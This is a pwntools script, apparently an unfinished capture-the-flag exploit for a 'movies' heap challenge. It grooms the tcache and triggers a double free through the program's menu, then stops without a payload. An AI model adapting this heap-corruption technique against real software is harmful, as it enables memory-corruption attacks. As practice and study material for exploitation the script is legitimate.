#!/usr/bin/python2

from pwn import *

exe = ELF("movies_patched")

context.binary = exe

sla = lambda r,a,b : r.sendlineafter('{}'.format(a),'{}'.format(b))

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("172.17.0.2", 1337)

    return r

def create_movie(r, payload):
    sla(r, ">", 1)
    sla(r, ">", payload)

def create_review(r, payload, index, size):
    sla(r, ">", 2)
    sla(r, ">", index)
    sla(r, ">", 2)
    sla(r, ">", size)
    sla(r, ">", 'n')
    sla(r, ">", payload)

def delete_review(r, index, rev_index):
    sla(r, ">", 2)
    sla(r, ">", index)
    sla(r, ">", 4)
    sla(r, ">", rev_index)

def init(r):
    create_movie(r, "CHEFCHEF")
    create_movie(r, "tchache fill")
    for i in range(8):
        create_review(r, "filler", 2, 60)
    create_movie(r, "CHEF2")
    create_review(r, "pad", 3, 60)

    for i in range(7):
        delete_review(r, 2, 2)

    create_review(r, "head", 1, 60)
    create_review(r, "target", 1, 60)

    delete_review(r, 1, 2)
    #delete_review(r, 3, 1)
    delete_review(r, 1, 2)

    #create_movie(r, "BRUH")
    #create_review(r, "chef", 4, 60)
    #create_review(r, "chef", 4, 60)
    #create_review(r, "chef2", 4, 60)


def main():
    r = conn()

    init(r)

    # good luck pwning :)
    #gdb.attach(r)

    r.interactive()


if __name__ == "__main__":
    main()
